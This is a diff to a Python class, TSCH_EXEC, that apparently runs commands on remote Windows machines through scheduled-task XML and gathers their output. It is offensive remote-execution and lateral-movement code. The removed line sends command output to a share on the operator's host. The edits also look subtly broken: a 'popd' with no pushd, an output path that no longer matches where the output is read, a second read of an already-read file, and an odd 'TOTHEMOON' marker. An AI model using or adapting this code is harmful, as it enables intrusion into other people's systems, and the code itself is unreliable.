@@ -101,9 +101,9 @@ class TSCH_EXEC:
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
                 command = command.replace('&', '&amp;')
-                argument_xml = "      <Arguments>/C {} &gt; \\\\{}@{}\\misc\\tmp\\{} 2&gt;&amp;1</Arguments>".format(command, local_ip, self.__port, tmpFileName)
+                argument_xml = "      <Arguments>/C {} &gt; tmp\\{} &amp; popd</Arguments>".format(command, tmpFileName)
             else:
-                argument_xml = "      <Arguments>/C {} &gt; %windir%\\Temp\\{} 2&gt;&amp;1</Arguments>".format(command, tmpFileName)
+                argument_xml = "      <Arguments>/C {} &gt; %windir%\\Temp\\{} &amp; popd</Arguments>".format(command, tmpFileName)
 
 
         elif self.__retOutput is False:
@@ -161,13 +161,11 @@ class TSCH_EXEC:
                     try:
                         with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', tmpFileName), 'r') as output:
                             out = output.read()
-                            if "Dump count reached" in out:
+                            if "TOTHEMOON" in out:
                                 self.output_callback(output.read())
                                 break
-                            else:
-                                time.sleep(1)
                     except IOError:
-                        time.sleep(2)
+                        time.sleep(1)
             else:
                 peer = ':'.join(map(str, self.__rpctransport.get_socket().getpeername()))
                 smbConnection = self.__rpctransport.get_smb_connection()
